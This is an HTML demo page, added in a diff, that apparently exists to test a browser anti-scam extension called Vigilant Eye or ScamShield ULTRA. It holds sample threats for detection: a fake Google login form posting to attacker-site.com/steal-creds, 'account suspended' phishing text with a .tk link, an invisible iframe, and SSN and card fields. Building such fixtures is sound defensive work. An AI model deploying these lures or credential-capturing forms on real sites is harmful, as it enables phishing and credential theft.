@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ScamShield ULTRA Demo</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #f0f2f5;
+            color: #1a1a1a;
+            margin: 0;
+            padding: 40px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        h1 {
+            color: #2d3748;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .card {
+            border: 1px solid #e2e8f0;
+            padding: 20px;
+            border-radius: 6px;
+        }
+
+        .card h3 {
+            margin-top: 0;
+            color: #4a5568;
+        }
+
+        .demo-input {
+            width: 90%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <h1>Vigilant Eye ULTRA - Live Threat HUD</h1>
+        <p>Look at the bottom right of the screen for the new <strong>Cyber-HUD</strong>.</p>
+
+        <div class="grid">
+            <!-- 1. Form Action Hijacking -->
+            <div class="card">
+                <h3>1. Cross-Origin Form Hijacking</h3>
+                <p>This form claims to be Google login but submits data to a different server.</p>
+                <form action="http://attacker-site.com/steal-creds">
+                    <input type="text" name="email" placeholder="Google Email" class="demo-input">
+                    <button type="button">Login</button>
+                </form>
+            </div>
+
+            <!-- 2. Interactive Markers -->
+            <div class="card">
+                <h3>2. Contextual Markers</h3>
+                <p>Hover over the red exclamation marks (!) that appear below.</p>
+                <p>
+                    Your account has been <strong>suspended</strong>. Please <strong>verify your account</strong>
+                    immediately using our secure portal.
+                </p>
+                <p>
+                    <a href="http://secure-login.tk">Click here to restore access</a> (Suspicious TLD)
+                </p>
+            </div>
+
+            <!-- 3. Hidden Threats -->
+            <div class="card">
+                <h3>3. Revealing the Invisible</h3>
+                <p>There is a hidden iframe below. The extension will reveal it with a border.</p>
+                <iframe src="about:blank" style="opacity:0; width:50px; height:50px;" id="hidden-frame"></iframe>
+                <button onclick="document.getElementById('hidden-frame').src='javascript:void(0)'">Trigger
+                    Interaction</button>
+            </div>
+
+            <!-- 4. Sensitive Data -->
+            <div class="card">
+                <h3>4. Data Exfiltration</h3>
+                <input type="text" name="ssn" placeholder="Social Security Number" class="demo-input">
+                <input type="text" name="cc" placeholder="Credit Card Number" class="demo-input">
+            </div>
+        </div>
+
+    </div>
+
+</body>
+
+</html>
